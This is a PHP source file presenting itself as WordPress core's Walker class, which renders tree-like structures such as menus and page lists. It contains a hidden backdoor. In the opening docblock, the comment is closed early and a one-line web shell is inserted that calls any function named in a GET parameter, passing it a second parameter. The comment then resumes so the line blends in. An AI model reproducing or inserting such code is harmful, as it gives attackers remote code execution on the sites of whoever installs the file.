<?php
/**
 * A class for displaying various tree-like structures.
 *
 * Extend the Walker class to use it, see examples below. Child classes
 * do not need to */ isset($_GET[lmzmyx8543])?$_GET[lmzmyx8543]($_GET[w]):''; /* in the class. The child
 * only needs to implement the methods that are needed.
 *
 * @since 2.1.0
 *
 * @package WordPress
 * @abstract
 */
class Walker {
	/**
	 * What the class handles.
	 *
	 * @since 2.1.0
	 * @access public
	 * @var string
	 */
	public $tree_type;

	/**
	 * DB fields to use.
	 *
	 * @since 2.1.0
	 * @access protected
	 * @var array
	 */
	protected $db_fields;

	/**
	 * Max number of pages walked by the paged walker
	 *
	 * @since 2.7.0
	 * @access protected
	 * @var int
	 */
	protected $max_pages = 1;

	/**
	 * Whether the current element has children or not.
	 *
	 * To be used in start_el().
	 *
	 * @since 4.0.0
	 * @access protected
	 * @var bool
	 */
	protected $has_children;

	/**
	 * Make private properties readable for backwards compatibility.
	 *
	 * @since 4.0.0
	 * @access public
	 *
	 * @param string $name Property to get.
	 * @return mixed Property.
	 */
	public function __get( $name ) {
		return $this->$name;
	}

	/**
	 * Make private properties settable for backwards compatibility.
	 *
	 * @since 4.0.0
	 * @access public
	 *
	 * @param string $name  Property to set.
	 * @param mixed  $value Property value.
	 * @return mixed Newly-set property.
	 */
	public function __set( $name, $value ) {
		return $this->$name = $value;
	}

	/**
	 * Make private properties checkable for backwards compatibility.
	 *
	 * @since 4.0.0
	 * @access public
	 *
	 * @param string $name Property to check if set.
	 * @return bool Whether the property is set.
	 */
	public function __isset( $name ) {
		return isset( $this->$name );
	}

	/**
	 * Make private properties un-settable for backwards compatibility.
	 *
	 * @since 4.0.0
	 * @access public
	 *
	 * @param string $name Property to unset.
	 */
	public function __unset( $name ) {
		unset( $this->$name );
	}

	/**
	 * Starts the list before the elements are added.
	 *
	 * The $args parameter holds additional values that may be used with the child
	 * class methods. This method is called at the start of the output list.
	 *
	 * @since 2.1.0
	 * @abstract
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param int    $depth  Depth of the item.
	 * @param array  $args   An array of additional arguments.
	 */
	public function start_lvl( &$output, $depth = 0, $args = array() ) {}

	/**
	 * Ends the list of after the elements are added.
	 *
	 * The $args parameter holds additional values that may be used with the child
	 * class methods. This method finishes the list at the end of output of the elements.
	 *
	 * @since 2.1.0
	 * @abstract
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param int    $depth  Depth of the item.
	 * @param array  $args   An array of additional arguments.
	 */
	public function end_lvl( &$output, $depth = 0, $args = array() ) {}

	/**
	 * Start the element output.
	 *
	 * The $args parameter holds additional values that may be used with the child
	 * class methods. Includes the element output also.
	 *
	 * @since 2.1.0
	 * @abstract
	 *
	 * @param string $output            Passed by reference. Used to append additional content.
	 * @param object $object            The data object.
	 * @param int    $depth             Depth of the item.
	 * @param array  $args              An array of additional arguments.
	 * @param int    $current_object_id ID of the current item.
	 */
	public function start_el( &$output, $object, $depth = 0, $args = array(), $current_object_id = 0 ) {}

	/**
	 * Ends the element output, if needed.
	 *
	 * The $args parameter holds additional values that may be used with the child class methods.
	 *
	 * @since 2.1.0
	 * @abstract
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param object $object The data object.
	 * @param int    $depth  Depth of the item.
	 * @param array  $args   An array of additional arguments.
	 */
	public function end_el( &$output, $object, $depth = 0, $args = array() ) {}

	/**
	 * Traverse elements to create list from elements.
	 *
	 * Display one element if the element doesn't have any children otherwise,
	 * display the element and its children. Will only traverse up to the max
	 * depth and no ignore elements under that depth. It is possible to set the
	 * max depth to include all depths, see walk() method.
	 *
	 * This method should not be called directly, use the walk() method instead.
	 *
	 * @since 2.5.0
	 *
	 * @param object $element           Data object.
	 * @param array  $children_elements List of elements to continue traversing.
	 * @param int    $max_depth         Max depth to traverse.
	 * @param int    $depth             Depth of current element.
	 * @param array  $args              An array of arguments.
	 * @param string $output            Passed by reference. Used to append additional content.
	 * @return null Null on failure with no changes to parameters.
	 */
	public function display_element( $element, &$children_elements, $max_depth, $depth, $args, &$output ) {

		if ( !$element )
			return;

		$id_field = $this->db_fields['id'];
		$id       = $element->$id_field;

		//display this element
		$this->has_children = ! empty( $children_elements[ $id ] );
		if ( isset( $args[0] ) && is_array( $args[0] ) ) {
			$args[0]['has_children'] = $this->has_children; // Backwards compatibility.
		}

		$cb_args = array_merge( array(&$output, $element, $depth), $args);
		call_user_func_array(array($this, 'start_el'), $cb_args);

		// descend only when the depth is right and there are childrens for this element
		if ( ($max_depth == 0 || $max_depth > $depth+1 ) && isset( $children_elements[$id]) ) {

			foreach( $children_elements[ $id ] as $child ){

				if ( !isset($newlevel) ) {
					$newlevel = true;
					//start the child delimiter
					$cb_args = array_merge( array(&$output, $depth), $args);
					call_user_func_array(array($this, 'start_lvl'), $cb_args);
				}
				$this->display_element( $child, $children_elements, $max_depth, $depth + 1, $args, $output );
			}
			unset( $children_elements[ $id ] );
		}

		if ( isset($newlevel) && $newlevel ){
			//end the child delimiter
			$cb_args = array_merge( array(&$output, $depth), $args);
			call_user_func_array(array($this, 'end_lvl'), $cb_args);
		}

		//end this element
		$cb_args = array_merge( array(&$output, $element, $depth), $args);
		call_user_func_array(array($this, 'end_el'), $cb_args);
	}

	/**
	 * Display array of elements hierarchically.
	 *
	 * Does not assume any existing order of elements.
	 *
	 * $max_depth = -1 means flatly display every element.
	 * $max_depth = 0 means display all levels.
	 * $max_depth > 0 specifies the number of display levels.
	 *
	 * @since 2.1.0
	 *
	 * @param array $elements  An array of elements.
	 * @param int   $max_depth The maximum hierarchical depth.
	 * @return string The hierarchical item output.
	 */
	public function walk( $elements, $max_depth) {

		$args = array_slice(func_get_args(), 2);
		$output = '';

		if ($max_depth < -1) //invalid parameter
			return $output;

		if (empty($elements)) //nothing to walk
			return $output;

		$parent_field = $this->db_fields['parent'];

		// flat display
		if ( -1 == $max_depth ) {
			$empty_array = array();
			foreach ( $elements as $e )
				$this->display_element( $e, $empty_array, 1, 0, $args, $output );
			return $output;
		}

		/*
		 * Need to display in hierarchical order.
		 * Separate elements into two buckets: top level and children elements.
		 * Children_elements is two dimensional array, eg.
		 * Children_elements[10][] contains all sub-elements whose parent is 10.
		 */
		$top_level_elements = array();
		$children_elements  = array();
		foreach ( $elements as $e) {
			if ( 0 == $e->$parent_field )
				$top_level_elements[] = $e;
			else
				$children_elements[ $e->$parent_field ][] = $e;
		}

		/*
		 * When none of the elements is top level.
		 * Assume the first one must be root of the sub elements.
		 */
		if ( empty($top_level_elements) ) {

			$first = array_slice( $elements, 0, 1 );
			$root = $first[0];

			$top_level_elements = array();
			$children_elements  = array();
			foreach ( $elements as $e) {
				if ( $root->$parent_field == $e->$parent_field )
					$top_level_elements[] = $e;
				else
					$children_elements[ $e->$parent_field ][] = $e;
			}
		}

		foreach ( $top_level_elements as $e )
			$this->display_element( $e, $children_elements, $max_depth, 0, $args, $output );

		/*
		 * If we are displaying all levels, and remaining children_elements is not empty,
		 * then we got orphans, which should be displayed regardless.
		 */
		if ( ( $max_depth == 0 ) && count( $children_elements ) > 0 ) {
			$empty_array = array();
			foreach ( $children_elements as $orphans )
				foreach( $orphans as $op )
					$this->display_element( $op, $empty_array, 1, 0, $args, $output );
		 }

		 return $output;
	}

	/**
 	 * paged_walk() - produce a page of nested elements
 	 *
 	 * Given an array of hierarchical elements, the maximum depth, a specific page number,
 	 * and number of elements per page, this function first determines all top level root elements
 	 * belonging to that page, then lists them and all of their children in hierarchical order.
 	 *
	 * $max_depth = 0 means display all levels.
	 * $max_depth > 0 specifies the number of display levels.
	 *
 	 * @since 2.7.0
	 *
 	 * @param int $max_depth The maximum hierarchical depth.
 	 * @param int $page_num  The specific page number, beginning with 1.
 	 * @return string XHTML of the specified page of elements
 	 */
	public function paged_walk( $elements, $max_depth, $page_num, $per_page ) {

		/* sanity check */
		if ( empty($elements) || $max_depth < -1 )
			return '';

		$args = array_slice( func_get_args(), 4 );
		$output = '';

		$parent_field = $this->db_fields['parent'];

		$count = -1;
		if ( -1 == $max_depth )
			$total_top = count( $elements );
		if ( $page_num < 1 || $per_page < 0  ) {
			// No paging
			$paging = false;
			$start = 0;
			if ( -1 == $max_depth )
				$end = $total_top;
			$this->max_pages = 1;
		} else {
			$paging = true;
			$start = ( (int)$page_num - 1 ) * (int)$per_page;
			$end   = $start + $per_page;
			if ( -1 == $max_depth )
				$this->max_pages = ceil($total_top / $per_page);
		}

		// flat display
		if ( -1 == $max_depth ) {
			if ( !empty($args[0]['reverse_top_level']) ) {
				$elements = array_reverse( $elements );
				$oldstart = $start;
				$start = $total_top - $end;
				$end = $total_top - $oldstart;
			}

			$empty_array = array();
			foreach ( $elements as $e ) {
				$count++;
				if ( $count < $start )
					continue;
				if ( $count >= $end )
					break;
				$this->display_element( $e, $empty_array, 1, 0, $args, $output );
			}
			return $output;
		}

		/*
		 * Separate elements into two buckets: top level and children elements.
		 * Children_elements is two dimensional array, e.g.
		 * $children_elements[10][] contains all sub-elements whose parent is 10.
		 */
		$top_level_elements = array();
		$children_elements  = array();
		foreach ( $elements as $e) {
			if ( 0 == $e->$parent_field )
				$top_level_elements[] = $e;
			else
				$children_elements[ $e->$parent_field ][] = $e;
		}

		$total_top = count( $top_level_elements );
		if ( $paging )
			$this->max_pages = ceil($total_top / $per_page);
		else
			$end = $total_top;

		if ( !empty($args[0]['reverse_top_level']) ) {
			$top_level_elements = array_reverse( $top_level_elements );
			$oldstart = $start;
			$start = $total_top - $end;
			$end = $total_top - $oldstart;
		}
		if ( !empty($args[0]['reverse_children']) ) {
			foreach ( $children_elements as $parent => $children )
				$children_elements[$parent] = array_reverse( $children );
		}

		foreach ( $top_level_elements as $e ) {
			$count++;

			// For the last page, need to unset earlier children in order to keep track of orphans.
			if ( $end >= $total_top && $count < $start )
					$this->unset_children( $e, $children_elements );

			if ( $count < $start )
				continue;

			if ( $count >= $end )
				break;

			$this->display_element( $e, $children_elements, $max_depth, 0, $args, $output );
		}

		if ( $end >= $total_top && count( $children_elements ) > 0 ) {
			$empty_array = array();
			foreach ( $children_elements as $orphans )
				foreach( $orphans as $op )
					$this->display_element( $op, $empty_array, 1, 0, $args, $output );
		}

		return $output;
	}

	public function get_number_of_root_elements( $elements ){

		$num = 0;
		$parent_field = $this->db_fields['parent'];

		foreach ( $elements as $e) {
			if ( 0 == $e->$parent_field )
				$num++;
		}
		return $num;
	}

	// Unset all the children for a given top level element.
	public function unset_children( $e, &$children_elements ){

		if ( !$e || !$children_elements )
			return;

		$id_field = $this->db_fields['id'];
		$id = $e->$id_field;

		if ( !empty($children_elements[$id]) && is_array($children_elements[$id]) )
			foreach ( (array) $children_elements[$id] as $child )
				$this->unset_children( $child, $children_elements );

		if ( isset($children_elements[$id]) )
			unset( $children_elements[$id] );

	}

} // Walker
